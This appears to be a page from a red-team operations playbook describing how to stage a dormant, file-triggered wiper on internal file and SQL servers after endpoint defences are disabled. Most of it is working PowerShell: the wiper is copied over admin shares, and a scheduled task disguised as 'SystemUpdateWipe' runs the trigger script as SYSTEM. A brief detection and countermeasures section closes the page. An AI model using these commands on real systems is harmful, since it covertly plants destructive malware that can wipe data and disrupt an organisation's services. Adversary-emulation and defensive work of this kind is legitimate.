
# Step 4b: Deploy Triggered Wiper Payload

**Objective**: Deploy a wiper script to high-value targets that remains dormant until triggered by a specific file (`wipe_trigger.txt`).

---

## Context

- Microsoft Defender and EDR tools are already disabled or suppressed (Step 4)
- Goal is to silently position a destructive payload that executes only when commanded
- This enables simulated impact operations such as file destruction and service disruption

---

## Execution

### 1. Upload Wiper Executable to Target(s)

Targets include `infra-file`, `infra-sql`, and `rnd-infra`.

```powershell
Copy-Item -Path C:\RedTeam\wiper.exe -Destination \\infra-file\C$\Windows\Temp\wiper.exe
Copy-Item -Path C:\RedTeam\wiper.exe -Destination \\infra-sql\C$\Windows\Temp\wiper.exe
```

### 2. Upload Wiper Script to Same Systems

```powershell
Copy-Item -Path C:\RedTeam\wiper_triggered.ps1 -Destination \\infra-file\C$\Windows\Temp\wiper_triggered.ps1
Copy-Item -Path C:\RedTeam\wiper_triggered.ps1 -Destination \\infra-sql\C$\Windows\Temp\wiper_triggered.ps1
```

### 3. Register Scheduled Task to Run Script on Reboot or Timer

```powershell
schtasks /Create /TN "SystemUpdateWipe" /TR "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\wiper_triggered.ps1" /SC ONCE /ST 02:00 /RU SYSTEM
```

---

## Wiper Script Logic

The `wiper_triggered.ps1` script will only launch the wiper executable if the `wipe_trigger.txt` file exists.

```powershell
$wiperTrigger = "C:\Windows\Temp\wipe_trigger.txt"

if (Test-Path $wiperTrigger) {
    Start-Process "C:\Windows\Temp\wiper.exe"
}
```

---

## Result

- Wiper is silently staged and will only execute if the Red Team chooses to trigger it
- Destructive impact can be precisely timed and limited to specific systems

---

## Detection Opportunities

| Event ID | Description |
|----------|-------------|
| 106      | Scheduled task creation |
| File events | Wiper binary or script dropped to disk |
| Endpoint behavior | Spikes in deletions, system instability, reboot artifacts |

---

## Defensive Countermeasures

- Use file integrity monitoring (FIM) for `C:\Windows\Temp\`
- Alert on unauthorized task creation by SYSTEM
- Segment backups from production to reduce blast radius
